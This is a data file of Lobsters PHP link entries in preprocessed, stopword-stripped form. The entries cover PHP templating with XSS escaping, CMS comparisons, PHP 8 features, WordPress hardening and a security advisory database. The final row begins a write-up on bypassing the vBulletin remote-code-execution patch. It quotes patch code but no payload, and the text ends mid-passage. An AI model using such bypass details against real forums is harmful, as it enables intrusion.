22,Lobsters,php,PHP programming,Back to Basics: PHP Templates (Part I),https://www.tuxed.net/fkooman/blog/back_to_basics_php_templates_part_one.html,back basic php template part,back basic php template part twig blade smarty plate ssi alternative syntax control structure shortcut syntax escaping output buffering variable extraction update lobster history,back basic php template part published series blog post take along process creating fully featured minimalist php template engine scratch would anyone ever want many available template engine like twig blade smarty plate good question reason came wanting really understand modern template engine work avoiding big complicated template framework dependency application first part post compare various template engine concept come first version template engine work many simple case part ii cover template inheritance part iii talk internationalization support concept template theme restrict php talk eg ssi also powerful enough use case look first purpose article define template mean separate application logic presentation word want avoid mixing application code way presented user browser broadly speaking two different approach building php template use language specifically designed template eg twig blade smarty use native php template plate first approach template engine like smarty twig blade using example show simple twig template html head title pagetitle title head body ul myfavoriteanimal myfavoriteanimals li myfavoriteanimal li endfor ul body html see twig project designed template syntax native php foreach loop replaced php echo replaced possible reason creating new template syntax may easier understand template designer case understand php another becomes easier automatically escape template variable mitigate cross site scripting x drawback custom template syntax relatively slow page display template need parsed first slower directly outputting html running embedded php code reason template engine template syntax caching mechanism convert template actual php first course caching mechanism introduces convert twig example php look like html head title pagetitle title head body ul php foreach myfavoriteanimals myfavoriteanimal li myfavoriteanimal li php endforeach ul body html see look quite similar twig example accomplished using two neat php feature alternative syntax control structure allow avoid using opening closing bracket making syntax easier read next shortcut syntax echo allows replace php echo v v simplifying template looking minimal template engine justify creating template syntax leverage php much possible however make use native php template easier neat trick explore concept php help u noted solution presented build heavily way plate work escaping consider following php code php userid get userid p hello userid p problem variable get userid escaped ie one could inject data specifying query parameter userid javascript code x vulnerability fix straightforward bit unwieldy native php template engine use something like php userid get userid p hello htmlspecialchars get userid entquotes p safe display value userid query parameter page course building template engine great need specify whole htmlspecialchars command every time want output variable figure something output buffering php use obstart obgetclean variant allows capture whatever script sends output variable php obstart name world include pagetplphp renderedtemplate obgetclean example file pagetplphp contains p hello name p variable renderedtemplate contain p hello world p html output evaluated php concept powerful fundamental part minimalist template engine variable extraction template engine allow specify template variable array eg php template render templatename userid foo usergroups admin employee template engine use extract convert key array actual php variable calling extract userid foo actually create variable userid current scope allows use userid template instead templatevariables userid concept explained create first version templatephp class php class template public function render templatename array templatevariables extract templatevariables obstart include templatename tplphp return obgetclean accompanying pagetplphp contains following html head title pagetitle title head body ul php foreach myfavoriteanimals myfavoriteanimal li myfavoriteanimal li php endforeach ul body html call template class like eg indexphp php new template echo render page pagetitle favorite animal myfavoriteanimals dog cat donkey work see variable yet escaped would introduce potential x vulnerability order fix add method e template class template class thus becomes php class template public function render templatename array templatevariables extract templatevariables obstart include templatename tplphp return obgetclean private function e v return htmlspecialchars v entquotes saw include used output buffering example allows use existing variable template neat trick template also use adding method e template class use e v template making output safe display browser make example complete update pagetplphp like html head title e pagetitle title head body ul php foreach myfavoriteanimals myfavoriteanimal li e myfavoriteanimal li php endforeach ul body html wrap basic presented fully working minimalist template engine stay tuned next part talk template inheritance internationalization theme update see discussion lobster history
23,Lobsters,php,PHP programming,WordPress vs Drupal is like Word vs Excel,https://www.freelock.com/blog/john-locke/2020-02/wordpress-vs-drupal-word-vs-excel,wordpress v drupal like word v excel,wait minute wordpress cm database everybody say use wordpress wrong ok lied drupal nt like excel like access give u call,seems like every day month answered question use drupal instead wordpress answer come entirely different application different microsoft word microsoft excel wordpress first foremost blogging tool become widely adopted designer trying make prettylooking site shortage beautiful wordpress site need relatively simple marketing site rich content great tool drupal hand like general purpose database tool skinned look great strength much like excel great managing lot item characteristic built work extremely well purpose managing scad information making flyer yard sale would nt necessarily pick excel word quick easy make something like pull sort design paste make something look pretty good make table show difference couple product hundred product start run problem create bunch comparison word full blown macro system built certainly excel using word nt mean good idea wait minute wordpress cm database yes wordpress call content management system basic architecture necessary publishing workflow api creating different post type adding custom field stuff drupal user interface creating field wordpress core either need get one many different usually proprietary addon plugins developer write code set post type contrast creating new content type adding field adding relationship content type drupal core fundamental starting point building new drupal site wordpress first decision typically pick theme lot theme come bunch extra functionality help actually build site drupal first decision organize content theme tacked towards end process easily changed point everybody say use wordpress wrong wrong use word matter choosing right tool job creating brochure way easier word excel trying keep track registered event word excel add filter calculated column keep track registration paid need collect payment door might well able find plugin help word suddenly really word using registration obscure plugin whereas tabulating data essence excel exactly difference wordpress drupal get beyond core layout blogging basic site functionality come word suddenly plugin land core functionality longer shared ten million wordpress user user specific plugin need different plugin different functionality need cross finger nt blow site weird conflict drupal built kind integration different kind thing need show event date add calendar need show location add map set geolocation need charge add commerce want user rate add voting module everything work together drupal build upon everything else instead oneoff island functionality may may work thing need ok lied drupal nt like excel like access lot people familiar excel access useful many different situation access general purpose database compared excel bit harder prototype thing way powerful early access competitor like filemaker pro popular tool build entire business operation system many small business nonprofit exactly kind thing drupal extremely well even organized way really hard take access database port everything drupal bring entire application web make available mobile device tablet remote worker etc business analysis skill even apply huge number scenario work administrator really need bring developer make look good add automation drupal cm general purpose database system use revolutionize entire business operation website particularly useful want remove barrier interact customer organize internal business process automate painstaking operational task would like learn make business run better using drupal similar technology give u call happy explore idea
24,Lobsters,php,PHP programming,Programming metaphors for theological concepts,https://shaungallagher.pressbin.com/blog/metaphors.html,programming metaphor theological concept,eternal security holy communion trinity diagram form impermanence parmenides flatland free moroni promise moroni promise true scotsman divine attribute,someone interesting programming religion often found helpful construct metaphor code illustrate religious concept like present one come big fat disclaimer none metaphor perfect far illustrate certain approach talking theological matter language comfortable software engineer please consider like conversation starter serious argument eternal security phrase saved always saved succinct summation doctrine eternal security also known perseverance saint asserts person becomes christian assurance eternal salvation assurance permanent way lose doctrine held christian notably reformed tradition influenced calvinism including many evangelicals rejected others catholic orthodox believe possible christian reject salvation eg mortal sin apostasy one programming metaphor use represent constant eternal security javascript hasbecomechristian true const issaved true issaved sendtogoodplace else sendtobadplace issaved constant set value changed fact could refactor code take issaved constant hasbecomechristian always going synonymous issaved refactored eternal security hasbecomechristian true sendtogoodplace else sendtobadplace contrast catholicism reject doctrine eternal security code look like catholic view salvation javascript let issaved false isalive true hasbeenbaptised true issaved true hascommittedmortalsin true hasreconciled false issaved false issaved sendtogoodplace else sendtobadplace example issaved constant variable whose value change time catholicism basically hold given gift salvation baptism possible reject gift mortal sin separate u god however also ability become reconciled god typically sacrament reconciliation restores relationship god gift salvation holy communion many christian denomination incorporate reception holy communion service disagreement though jesus meant last supper instituted practice denomination catholicism orthodoxy believe bread wine consecrated cease bread wine become body blood jesus catholic call transubstantiation orthodox use terminology mean essentially thing transubstantiation python class bread def init self selfisdivine false class body def init self selfisdivine true substance bread assert substanceisdivine false consecrated substance body assert isinstance substance bread false assert isinstance substance body true assert substanceisdivine true protestant denomination lutheranism hold jesus really present holy communion cease bread wine instead jesus body blood present form bread wine lutheranism doctrine real presence python class bread pas class body pas class holycommunion body bread pas hc holycommunion assert isinstance hc bread true assert isinstance hc body true denomination including many baptist treat holy communion mere symbol jesus body blood view called memorialism trinity christian concept holy trinity tricky one represent metaphor shamrock metaphor popularly attributed st patrick commits ancient heresy partialism water metaphor three common state water solid liquid gas represent three person trinity commits ancient heresy modalism pretty much every common analogy problematic aspect one programming metaphor like although nt capture full mystery trinity far tell commit famous heresy best viewed diagram form code holy trinity javascript const father const son const spirit const god consoleassert father god consoleassert son god consoleassert spirit god consoleassert father son consoleassert son spirit consoleassert father spirit impermanence several eastern religion buddhism hinduism core doctrine assert thing impermanent fact according doctrine nothing eternal everything changing time nothing ever stay antithesis view held greek philosopher parmenides asserted nothing change like ever might sound absurd clearly see thing around u changing time thing appear change temporal being perceive one slice temporal reality time twodimensional being flatland see threedimensional being shapechangers view crosssection perhaps existence one eternal unchanging thing mere mortal perceive changing ca nt take let set code illustrates view differ permanance v impermanence php population array array array array array array impermanence count population echo population population changedn unchangedn permanence echo population population changedn unchangedn iterating slice time clear one slice necessarily equal another slice fact depending precision physical temporal scale using might even able say one slice necessarily equal another slice looking existence holistically clear parent array change never redefined mutated free argument permanence convenient leadin topic free concept foundational many religion determinism true action result free choice merely necessary inevitable result everything come beforehand omniscient god already know choice make would seem lack ability choose otherwise put free question stake well free exist really held responsible bad choice make know question free one confronted numerous world religion familiar treatment christianity focus many christian denomination admit form divine predestination biblical evidence view well evidence reason byproduct god omniscience bible predestination often symbolized book life god inscribed name enter heaven broadly significant divide christian believe divine predestination render free utterly impossible believe free god foreknowledge choice compatible calvinist theology get doctrine none u ability anything good whatsoever except god grace also god grace irresistible mean god withholds grace lack freedom choose good god supply grace lack freedom choose evil seems like pretty robust denial free calvin worth made distinction necessity coersion god witholds grace sin necessity meaning mean otherwise nt mean calvin argues god force u sin still make choice depraved nature always make wrong choice alternative view asserts choice indeed free choose respond god grace enables u good reject grace evil instead divine predestination view merely god foreknowledge choice freely make granted nt completely resolve paradox whether action said free god already know choose interesting argument attempt resolve paradox instance one associated st thomas aquinas sidestep issue acknowledging choose action action god know choose god omniscient know option would choose could choose absolute freedom omnipotence ability motivate u choose option little complex argument express programming metaphor though instead going try illustrate calvinist view opposing view broad stroke free go func getchoice option string preference string string len option return option else choose either option based one preference return makechoice option preference func evaluatecalvinist hasgrace bool string hasgrace return good else return bad func evaluatecompatibilist hasgrace bool string var option string option make string option bad hasgrace option good var preference string preference make string preference increase pleasure preference increase holiness var choice getchoice option preference return choice func main var hasgrace bool false var choice evaluatecalvinist hasgrace fmtprintln choice always return bad hasgrace true choice evaluatecalvinist hasgrace fmtprintln choice always return good hasgrace false choice evaluatecompatibilist hasgrace fmtprintln choice always return bad hasgrace true choice evaluatecompatibilist hasgrace fmtprintln choice return bad good based person preference moroni promise book mormon member church jesus christ latterday saint consider sacred text said founder joseph smith english translation ancient writing engraved gold plate fifth century buried presentday new york revealed smith angel early century like bible book mormon consists several subbooks last purportedly written prophet moroni passage known moroni promise prophet say anyone read text prays god reveal whether true god make truth known one thing always interested whether perceiving yes true answer prayer sufficient trust veracity book mormon simple moroni promise rust let answer prayforanswer answer true println book mormon true else println book mormon true nt think simple really matter whether one sincere person hears yes whether every sincere person hears yes improved moroni promise rust let mut alltrue true let allanswers getallanswers answer allanswersiter answer false alltrue false alltrue true println book mormon true else println book mormon true single invalidate moroni promise mean god given two mutually exclusive answer two different people assuming god ca nt lie conclude personal interpretation answer prayer however sincere might effective way discern truth book mormon lds adherent might answer anyone receives must fulfilled condition promise perhaps nt study text enough focus nt pray enough sincerity nt wait long enough receive yes answer misinterpreted answer perceived strike true scotsman approach counterexample since lds guess true scotsman either divine attribute several attribute traditionally associated god classical western theism among omniscience omnipotence omnipresence sometimes divine attribute pitted even case wellknown puzzler omnipotent god create immovable object version paradox make challenge explicit god create object big move standard answer paradox omnipotence traditionally ascribed god mean anything logically possible mean create object square shape object circle shape object whose shape simultaneously square circular logical impossibility actually prefer different answer paradox one offer smartalecky answer smartalecky question yes omnipotent god create immovable physical object object size tennis ball constraint physical object exist simultaneously universe mean entirety physical existence must consist tennis ball nothing else argue object would immovable move thing always move relative something else something else object immovable immovable object detection sql select id exists select existentobjects id eoid moveable existentobjects eo database one row yield id moveable database one row yield id moveable
25,Lobsters,php,PHP programming,How to secure your WordPress site in 2020: The definitive guide,https://markosaric.com/secure-wordpress/,secure wordpress site definitive guide,secure wordpress site wordpress security checklist use unique username strong password turn require verification install theme plugins untrusted source updated automatically backup automatically containerbased isolation wordpress vulnerable insecure serious blogging platform default username andor weak password outdated wordpress software obsolete version php outdated theme plugins crosscontaminate blog hosted server best wordpress security plugins identify existing vulnerability malware malicious code script date software known security issue sucuri sitecheck search console wordfence security host blog secure hosting company best protection crosscontamination use secure wordpress host learn greengeeks happy paying customer greengeeks service automatically updated soon new release nightly backup data containerbased isolation spam protection realtime malware virus monitoring free ssl certificate let encrypt customer support via live chat email phone turn verification completely prevents brute force attack secure sign enable twostep wordpresscom install activate jetpack plugin turn single sign option require twostep authentication disable default wordpress login form block unwanted brute force login attempt jetpack protect automatically block unwanted try bad ip address rest network automate update wordpress plugins vast majority security compromise happen outdated plugins blog design limit number plugins theme installed download theme plugins unknown source plugins theme high number downloads active wordpress user regular update recent last update create new user account limit unauthorized access role capability user add new give role administrator log default admin account log new user detail delete default admin username transfer old post new username use strong secure password least twelve character number special character upper lowercase free tool set new nickname user profile nickname field display name publicly allow guest user registration make sure anyone register option unticked allow ping used ddos attack default article setting tick allow link notification pingbacks trackbacks take regular automatic backup greengeeks database file recommended perform regular full backup entire site updraftplus improve wordpress security,guide feature simple security measure implement secure wordpress site prevent hacking attack keep content safe include best wordpress security solution precaution post follow sleeping safelywordpress security checklistthere many wordpress security guide even step protect wordpress site many step completely unnecessary average userhere quick simple step take keep wordpress site safe secure use unique username strong password administrative accountsturn require verification administrative accountsdon install theme plugins untrusted sourcesset wordpress theme plugins updated automaticallyset wordpress backup automaticallyuse host containerbased isolation protects site contaminated insecure site serverthese six step take minute implement need worry wordpress security able focus building great website insteadwhy wordpress vulnerable insecure wordpress serious security secure software wordpress security team made security expert developer open source software many eye keep whole content management system safe secureso hear wordpress vulnerable insecure wordpress widely used cm blogging platform market share entire webthe popularity wordpress website make regular target brute force login attack attempt discover site use default username andor weak password sensitive information key keeping blog safe securea bruteforce attacker log many password hope guessing correctly attacker systematically check possible option correct one founduse twofactor authentication wordpress admin dashboard login effective brute force protectionthe second common attack outdated wordpress software obsolete version php outdated theme plugins key always update everythingboth type attack automated across hosting platform specifically target blog onlyif succeed infect blog adequately secured may even crosscontaminate blog hosted server let happen youbest wordpress security plugins identify existing vulnerabilitythere several wordpress security plugins tool use figure blog current weaknessthey scan malware malicious code script date software known security issue wordpress security plugins help keep blog safe best option include free version sucuri sitecheck sucuri plugin browserbased tool quick scan checksearch console security manual action section notifies google detects malware security issue wordpress websitewordfence security popular wordpress security plugin used million site feature login security firewall malware scannerhost blog secure hosting companyone vulnerability crosscontamination site hosted unprotected shared server exploitable site get attacked site server infected toothis happened blog time hosted godaddy initially blamed hack inexperience using best practicessince learned hack happen made wary using host well protected best protection crosscontamination use secure wordpress host ask host security precaution take crosscontaminationmy site readersupported make purchase link site may earn affiliate commission help keep site advertising trackingfree change price pay recommend product truly believe valuable learn moreright blog hosted greengeeks happy report security issue yet finger crossed continues happy paying customer greengeeks service several security measure server configuration additional feature place take advantage using wordpress installation wordpress blog automatically updated soon new release take actionthere nightly backup data case emergency fortunately deal backup yetthey containerbased isolation mean blog kept separated blog infected crosscontaminationinbuilt spam protection realtime malware virus monitoringyou also get free domain name free ssl certificate let encrypt prevent site labeled secure different customer support via live chat email phone case necessaryturn verificationtwofactor verification add extra layer security wordpress login url completely prevents brute force attackswithout access phone simply impossible break login page even attacker know username passwordturn secure sign jetpack one easiest way enable two factor authentication wordpress let log selfhosted site wordpresscom logins wordpresscom allows require twofactor authenticationenable twostep wordpresscom account twostep authentication within security install activate jetpack plugin selfhosted wordpress admin areaturn single sign optiontick box require twostep authentication insert code theme functionsphp file disable default wordpress login form addfilter jetpackremoveloginform returntrue log selfhosted blog using wordpresscom login detail require twofactor authentication phone default login disabledtwo step authentication far best way stop people trying brute force way wpadmin dashboard highly recommend itin past used several different hack prevent attack changing url default wordpress login page blocking ip address except trying login two step authentication much elegant solutionblock unwanted brute force login attemptsif whatever reason turn twostep authentication decent alternativejetpack protect like web application firewall wordpress monitor failed login attempt network site hosted wordpress automatically block unwanted try bad ip address rest networkanother common way hacker try brute force site xmlrpc jetpack protect also block xmlrpc attack need anything disable xmlrpc using jetpackactivate jetpack plugin enable protect addon turn onthe alternative wp limit login attempt pluginautomate update wordpress pluginsmain reason developer release new version frequently caused security vulnerability found older version vast majority security compromise happen outdated pluginsautomatic update work keep safe always upgrade latest version wordpress newest version blog design theme plugins useupgrading simple automated oneclick process within wordpress admin interface new update available wordpress give notice top dashboardthe recent version feature automatic background update may find secure host update latest version automatically sleep mine doesthemes plugins automatic update possible since wordpress release august number plugins theme installedkeep entry point attack minimum install theme plugins actively use necessary run blog remove anything usedminimize number plugins use jetpack instance replaces several different pluginsdon download theme plugins unknown source use official plugins theme official website trusted source premium theme pluginsthese quality sign look plugin theme high number downloads active wordpress usersregular update recent last updatecreate new user account limit unauthorized accessit harder hacker break wordpress account username password cracked username admin frequent target brute force attack easy target deleted usedreduce number people admin access blog minimum anyone need admin access easy role capabilitieshere create new user delete default admin user create user going user add new wordpress menuwhen creating new user make sure give role administrator ensure full authority wordpress website securitynow log default admin account log new user detailsin user delete default admin usernamemake sure choose option transfer old post new username deleting admin accountuse strong secure passwordsdon use simple password wordpress account simple password might make easy remember also accessible hacker crackuse strong secure password instead password least twelve character longinclude number special character upper lowercase lettershere free tool norton help create strong passwordset new nicknameyou want new username author name shown post way hacker easy way finding new usernameset nickname account something different username go user profile choose new nickname nickname fieldset display name publicly new nicknamedo allow guest user registrationsyou membership site reason allow visitor register guest accountcheck got registration turned click setting make sure anyone register option untickeddo allow pingswordpress pingback option enabled used ddos attack site option enabled default important disable itin setting go discussion default article setting tick allow link notification pingbacks trackbacks take regular automatic backupstaking daily weekly automatic backup content database essential good hosting provider execute system backup part mine doesat time set wordpress site greengeeks select automatic updated automatic backup still take personal responsibility regular backup wordpress consists two part database place setting page post comment storedfiles include medium attachment theme pluginsit recommended perform regular full backup entire site plethora option best free plugin updraftplus used million blogsin case site get hacked infected virus malware able restore fully functioning backupthese simple step executed relatively quickly improve wordpress security make site much harder break intoyou probably hacking problem feel safer able focus time writing exciting content building audience
26,Lobsters,php,PHP programming,"PHP, Seriously! (2014)",https://www.infoq.com/presentations/php-facebook/,php seriously,infoq homepage presentation php seriously summary bio conference related sponsored content,infoq homepage presentation php seriously php seriously summary keith adam examines strength made php dominant language niche highlighting facebook attempt remedying inconsistency misfeatures maintaining strength bio keith adam virtual machinist facebook one initial designer implementers hhvm open source php jit run facebook frontend series mostly fortunate event keith became founding member icantbelieveimaphpadvocate club working facebook keith worked vmware virtual machine monitor conference splash home oopsla onward dl oopsla forum many important software development last decade crc card clos design pattern agile soa wikis uml tdd refactoring java aspect onward programming software process method language community application dl address dynamic language implementation application recorded feb related sponsored content
27,Lobsters,php,PHP programming,What's new in PHP 8,https://stitcher.io/blog/new-in-php-8,new php,new php november jit compiler union type attribute new feature union type rfc benchmark nullsafe operator rfc null coalescing operator named argument rfc named argument post attribute rfc attribute another rfc attribute depth undecided match expression rfc dedicated post new return type rfc new type rfc throw expression rfc inheritance private method rfc weak map rfc weakrefs rfc allowing object rfc noncapturing catch rfc trailing comma parameter list rfc separate rfc create object interface new interface rfc new function rfc new function rfc new function pr new function rfc new function pr abstract method trait improvement rfc object implementation rfc variable syntax tweak rfc type annotation internal function external pitched always available rfc breaking change upgrading consistent type error rfc reclassified engine warning rfc operator longer silence fatal error default error reporting level default pdo error mode rfc concatenation precedence rfc stricter type check arithmetic bitwise operator rfc namespaced name single token rfc saner numeric string rfc saner string number comparison rfc reflection method signature change stable sorting rfc fatal error incompatible method signature rfc deprecation change newsletter twitter pr,new php php released november new major version mean introduce breaking change well lot new feature performance improvement right php feature freeze meaning new feature added anymore breaking change higher chance need make change code get running php kept date latest release though upgrade nt hard since breaking change deprecated version nt worry deprecation listed post besides breaking change php also brings nice set new feature jit compiler union type attribute new feature union type rfc given dynamically typed nature php lot case union type useful union type collection two type indicate either one used public function foo foobar input intfloat note void never part union type since indicates return value furthermore nullable union written using null using existing notation public function foo foonull foo void public function bar bar bar void jit time compiler promise significant performance improvement albeit always within context web request done benchmark reallife web application seems like jit nt make much difference kind php project want know jit php read another post wrote nullsafe operator rfc familiar null coalescing operator already familiar shortcoming nt work method call instead need intermediate check rely optional helper provided framework startdate booking getstartdate dateasstring startdate startdate asdatetimestring null addition nullsafe operator null coalescinglike behaviour method dateasstring booking getstartdate asdatetimestring named argument rfc named argument allow pas value function specifying value name nt take order consideration also skip optional parameter function foo string string b string c null string null foo b value b value value read indepth post attribute rfc attribute commonly known annotation language offer way add meta data class without parse docblocks quick look example attribute look like rfc use appattributesexampleattribute exampleattribute class foo exampleattribute public const foo foo exampleattribute public x exampleattribute public function foo exampleattribute bar attribute class exampleattribute public value public function construct value value value note base attribute used called phpattribute original rfc changed another rfc afterwards want take deep dive attribute work build read attribute depth blog also note attribute syntax still change still undecided match expression rfc could call big brother switch expresion match return value nt require break statement combine condition us strict type comparison nt type coercion look like result match input hello world read match expression detail rfc add syntactic sugar create value object data transfer object instead specifying class property constructor php combine one instead class money public currency currency public int amount public function construct currency currency int amount currency currency amount amount class money public function construct public currency currency public int amount lot tell property promotion read dedicated post new static return type rfc already possible return self static nt valid return type php given php dynamically typed nature feature useful many developer class foo public function test static return new static new mixed type rfc might call necessary evil mixed type cause many mixed feeling good argument make though missing type mean lot thing php function return nothing null expecting one several type expecting type ca nt type hinted php reason good thing mixed type added mixed mean one type array bool callable int float null object resource string note mixed also used parameter property type return type also note since mixed already includes null allowed make nullable following trigger error function bar mixed throw expression rfc rfc change throw statement expression make possible throw exception many new place triggererror fn throw new myerror foo bar offset throw new offsetdoesnotexist offset inheritance private method rfc previously php used apply inheritance check public protected private method word private method follow method signature rule protected public method nt make sense since private method wo nt accessible child class rfc changed behaviour inheritance check performed private method anymore furthermore use final private function also nt make sense trigger warning warning private method final never overridden class weak map rfc built upon weakrefs rfc added php weakmap implementation added php weakmap hold reference object nt prevent object garbage collected take example orms often implement cache hold reference entity class improve performance relation entity entity object garbage collected long cache reference even cache thing referencing caching layer us weak reference map instead php garbage collect object nothing else reference anymore especially case orms manage several hundred thousand entity within request weak map offer better resource friendly way dealing object weak map look like example rfc class foo private weakmap cache public function getsomethingwithcaching object obj object return cache obj computesomethingexpensive obj allowing class object rfc small yet useful new feature possible use class object instead use getclass work way getclass foo new foo vardump foo class noncapturing catch rfc whenever wanted catch exception php store variable regardless whether used variable noncapturing catch omit variable instead try catch myspecialexception exception log error something went wrong try catch myspecialexception log error something went wrong note required always specify type allowed empty catch want catch exception error use throwable catching type trailing comma parameter list rfc already possible calling function trailing comma support still lacking parameter list allowed php meaning following public function string parametera int parameterb foo objectfoo sidenote trailing comma also supported use list closure oversight added via separate rfc create datetime object interface already create datetime object datetimeimmutable object using datetime createfromimmutable immutabledatetime way around tricky adding datetime createfrominterface datetimeimmutable createfrominterface generalised way convert datetime datetimeimmutable object datetime createfrominterface datetimeinterface datetimeimmutable createfrominterface datetimeinterface new stringable interface rfc stringable interface used type hint anything string implement tostring furthermore whenever class implement tostring automatically implement interface behind scene need manually implement class foo public function tostring string return foo function bar stringable stringable bar new foo bar abc new strcontains function rfc might say long overdue finally nt rely strpos anymore know whether string contains another string instead strpos string lot word word false strcontains string lot word word new strstartswith strendswith function rfc two one long overdue two function added core strstartswith haystack hay strendswith haystack stack new fdiv function pr new fdiv function something similar fmod intdiv function allows division instead error get inf inf nan depending case new getdebugtype function rfc getdebugtype return type variable sound like something gettype would getdebugtype return useful output array string anonymous class object example calling gettype class foobar would return object using getdebugtype return class name full list difference getdebugtype gettype found rfc new getresourceid function pr resource special variable php referring external resource one example mysql connection another one file handle one resource get assigned id though previously way know id cast resource int resourceid int resource php add getresourceid function making operation obvious typesafe resourceid getresourceid resource abstract method trait improvement rfc trait specify abstract method must implemented class using caveat though php signature method implementation nt validated following valid trait test abstract public function test int input int class usestrait use test public function test input return input php perform proper method signature validation using trait implementing abstract method mean need write instead class usestrait use test public function test int input int return input object implementation tokengetall rfc tokengetall function return array value rfc add phptoken class phptoken getall method implementation work object instead plain value consumes le memory easier read variable syntax tweak rfc rfc uniform variable syntax rfc resolved number inconsistency php variable syntax rfc intends address small handful case overlooked type annotation internal function external lot people pitched add proper type annotation internal function long standing issue finally solvable change made php previous version mean internal function method complete type information reflection extjson always available rfc previously possible compile php without json extension enabled possible anymore since json widely used best developer always rely instead ensure extension exist first breaking change mentioned major update thus breaking change best thing take look full list breaking change upgrading document many breaking change deprecated previous version though staying uptodate year nt hard upgrade php consistent type error rfc userdefined function php already throw typeerror internal function rather emitted warning returned null php behaviour internal function made consistent reclassified engine warning rfc lot error previously triggered warning notice converted proper error following warning changed undefined variable error exception instead notice undefined array index warning instead notice division zero divisionbyzeroerror exception instead warning attempt incrementdecrement property nonobject error exception instead warning attempt modify property nonobject error exception instead warning attempt assign property nonobject error exception instead warning creating default object empty value error exception instead warning trying get property nonobject warning instead notice undefined property warning instead notice add element array next element already occupied error exception instead warning unset offset nonarray variable error exception instead warning use scalar value array error exception instead warning array traversables unpacked typeerror exception instead warning invalid argument supplied foreach typeerror exception instead warning illegal offset type typeerror exception instead warning illegal offset type isset empty typeerror exception instead warning illegal offset type unset typeerror exception instead warning array string conversion warning instead notice resource id used offset casting integer warning instead notice string offset cast occurred warning instead notice uninitialized string offset warning instead notice assign empty string string offset error exception instead warning supplied resource valid stream resource typeerror exception instead warning operator longer silence fatal error possible change might reveal error hidden php make sure set displayerrorsoff production server default error reporting level eall instead everything enotice edeprecated mean many error might pop previously silently ignored though probably already existent php default pdo error mode rfc rfc current default error mode pdo silent mean sql error occurs error warning may emitted exception thrown unless developer implement explicit error handling rfc change default error change pdo errmodeexception php concatenation precedence rfc already deprecated php change taken effect write something like echo sum b php would previously interpret like echo sum b php make interpreted like echo sum b stricter type check arithmetic bitwise operator rfc php possible apply arithmetic bitwise operator array resource object nt possible anymore throw typeerror object namespaced name single token rfc php used interpret part namespace separated backslash sequence token rfc changed behaviour meaning reserved name used namespaces saner numeric string rfc php type system try lot smart thing encounter number string rfc make behaviour consistent clear saner string number comparison rfc rfc fix strange case php foo result true edge case like one rfc fix reflection method signature change three method signature reflection class changed reflectionclass newinstance args reflectionfunction invoke args reflectionmethod invoke object args become reflectionclass newinstance args reflectionfunction invoke args reflectionmethod invoke object args upgrading guide specifies extend class still want support php php following signature allowed reflectionclass newinstance arg null args reflectionfunction invoke arg null args reflectionmethod invoke object arg null args stable sorting rfc php sorting algorithm unstable mean order equal element nt guaranteed php change behaviour sorting function stable sorting fatal error incompatible method signature rfc rfc inheritance error due incompatible method signature currently either throw fatal error warning depending cause error inheritance hierarchy deprecation change php development several deprecation added finalised php would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
28,Lobsters,php,PHP programming,PHP Security Advisories Database,https://github.com/FriendsOfPHP/security-advisories/,php security advisory database,php security advisory database must license checking vulnerability symfony cli http securitysymfonycom php cli tool tip github action contributing must merge,php security advisory database php security advisory database reference known security vulnerability various php project library database must serve primary source information security issue authoritative referenced software allows centralize information convenience easy consumption license php security advisory database free unencumbered software released public domain checking vulnerability several possibility check vulnerability application beside manual check recommended use symfony cli php dependency thirdparty api call check done locally clone repository symfony security check pathtocomposerlock upload composerlock file http securitysymfonycom use php cli tool php checker security check pathtocomposerlock tip using github use php security checker github action automatically check vulnerability pushing code contributing contributing security advisory easy get contribute new entry sending pull request creating file directly via github interface create directory based composer name software security issue exists use symfonyhttpfoundation issue symfony httpfoundation component instance security issue must saved file name cve identifier preferred date security issue announced followed increment instance file yaml format must contain following entry look existing entry example title text describes security issue word link link official security issue announcement http link preferred http one reference unique reference identify software supported scheme composer followed composer identifier branch hash affected branch name branch name like value hash following entry time date time utc security issue fixed null issue fixed yet time date merge commit fixed issue following format information must accurate possible used determine project affected version array constraint describing affected version branch format one used composer cve identifier add cve key make sure file validates running php validatorphp root project script need dependency installed via composer need run composer install affected code available different composer entry like readonly subtree split main repository duplicate information several file
29,Lobsters,php,PHP programming,Exploiting vBulletin: “A Tale of a Patch Fail”,https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/,exploiting vbulletin tale patch fail,zenofex uncategorized comment undisclosed researcher released bug allowed php remote code execution vbulletin popular vulnerability broker cv score problem ahead bypassing two characteristic widgettabbedcontainertabpanel template allow u effectively bypass filtering previously done prevent exploited poc full exploit bash exploit python exploit metasploit module found slide exploiting vbulletin tale patch fail short term fix,posted august author zenofex filed uncategorized comment september undisclosed researcher released bug allowed php remote code execution vbulletin bug labeled bugdoor simplicity popular vulnerability broker marked cv score giving critical rating today going talk patch supplied vulnerability inadequate blocking exploitation show bypass resulting fix releasing bash oneliner resulting remote code execution latest vbulletin software vulnerability mentioned later formally labeled patch issued september although patch provided day patch seemed time fix proof concept exploit provided unnamed finder patch consisted three main change provided set patch first shown remove problematic value template variable array rendering nt pas value array potentially large nt want make unnecesary copy alternative pas reference cause headache internal function relevant array class variable private function cleanregistered disallowednames array widgetconfig foreach disallowednames name unset registered name unset self globalregistered name remove problematic value template variable array rendering nt pas value array potentially large nt want make unnecesary copy alternative pas reference cause headache internal function relevant array class variable private function cleanregistered disallowednames array widgetconfig foreach disallowednames name unset registered name unset self globalregistered name function added unfortunately obtained code opposed directly diff two coded base vbulletin provide older insecure version software patch released therefore code pulled directly patch level cleanregistered function added first fix vulnerability simply iterates list nonallowed registered variable deleting content found list added contained name single variable contained php code execute released exploit next version software vbulletin following piece added prevent future problem widgetrendering template code diff ur throw new ajax render array invalidrequest router new router setrouteinfo array action actionrender argument serverdata template routeinfo use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight templatename routeinfo templatename widgetphp result array template csslinks array else router new router setrouteinfo array action actionrender argument serverdata template templatename use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight result staticrenderajax templatename serverdata sendasjson staticrenderajax routeinfo serverdata sendasjson result diff ur throw new ajax render array invalidrequest router new router setrouteinfo array action actionrender argument serverdata template routeinfo use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight templatename routeinfo templatename widgetphp result array template csslinks array else router new router setrouteinfo array action actionrender argument serverdata template templatename use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight result staticrenderajax templatename serverdata sendasjson staticrenderajax routeinfo serverdata sendasjson result portion patch created statement would return empty template cs data widgetphp template listed last portion route two change prevented poc functioning released state third change found second part vbulletin update diff diff ur class intended allow runtime know template rendering 